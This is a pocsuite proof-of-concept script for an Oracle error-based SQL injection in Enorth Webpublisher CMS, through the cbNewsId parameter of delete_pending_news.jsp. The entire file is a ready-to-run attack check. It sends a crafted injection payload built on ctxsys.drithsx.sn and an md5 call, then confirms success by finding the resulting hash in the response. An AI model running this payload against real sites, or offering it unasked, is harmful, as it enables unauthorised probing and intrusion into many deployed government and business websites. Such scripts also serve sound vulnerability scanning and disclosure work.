#!/usr/bin/env python
# coding: utf-8

from urlparse import urljoin
from pocsuite.net import req
from pocsuite.poc import POCBase, Output
from pocsuite.utils import register


class TestPOC(POCBase):
    vulID = '89306'  # vul ID
    version = '1'
    author = ['cnyql']
    vulDate = '2015-09-02'
    createDate = '2015-09-02'
    updateDate = '2015-09-12'
    references = ['http://www.sebug.net/vuldb/ssvid-89306']
    name = 'Enorth Webpublisher CMS SQL Injection from delete_pending_news.jsp'
    appPowerLink = 'http://webpublisher.enorth.com.cn/'
    appName = 'Enorth Webpublisher CMS'
    appVersion = 'unknown'
    vulType = 'SQL Injection'
    desc = '''
    Enorth Webpublisher CMS so far of the scale of tens of thousands of web sites, with the government, enterprises, scientific research and education and media industries fields such as nearly thousands of business users.
    '''

    def _verify(self):
        payload = "pub/m_pending_news/delete_pending_news.jsp?cbNewsId=1)%20and%201=ctxsys.drithsx.sn(1,(Utl_Raw.Cast_To_Raw(sys.dbms_obfuscation_toolkit.md5(input_string => '3.14'))))?"
        # ORACLE ERROR BASED INJ

        res = req.get(urljoin(self.url, payload), timeout=5)
        return self.parse_verify(res, payload)
    
    def parse_verify(self, res, payload):
        output = Output(self)
        result = {}

        if '4beed3b9c4a886067de0e3a094246f78' in res.content:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = urljoin(self.url, payload)
            output.success(result)

        else:
            output.fail('Internet Nothing returned')

        return output


register(TestPOC)
